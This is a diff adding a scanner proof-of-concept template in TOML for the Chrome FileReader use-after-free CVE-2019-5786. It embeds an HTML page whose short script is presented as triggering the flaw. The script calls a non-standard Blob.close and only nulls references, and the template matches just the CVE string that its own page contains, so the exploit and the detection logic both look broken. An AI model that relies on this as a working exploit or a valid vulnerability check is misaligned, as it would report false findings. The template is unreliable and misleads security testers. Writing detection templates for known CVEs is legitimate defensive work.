@@ -1,0 +1,50 @@
+[info]
+author = "AVE"
+description = "检测 Google Chrome FileReader 释放后使用漏洞（CVE-2019-5786），通过构造特制 HTML 页面触发 FileReader 对象的 UAF 条件"
+id = "POC-AVE-2019-1314"
+name = "CVE-2019-5786 PoC"
+severity = "high"
+tags = ["ave-2019-1314"]
+vuln_id = [
+    "CVE-2019-5786",
+    "AVE-2019-1314",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cve-2019-5786-poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>CVE-2019-5786 PoC</title>
+</head>
+<body>
+<h1>CVE-2019-5786 PoC</h1>
+<p>FileReader Use-After-Free vulnerability test for Chrome &lt; 72.0.3626.121</p>
+<script>
+var ab = new ArrayBuffer(0x1000);
+var blob = new Blob([ab]);
+var reader = new FileReader();
+reader.readAsArrayBuffer(blob);
+var closed = Blob.prototype.close.call(blob);
+reader = null;
+blob = null;
+ab = null;
+</script>
+</body>
+</html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["CVE-2019-5786"]
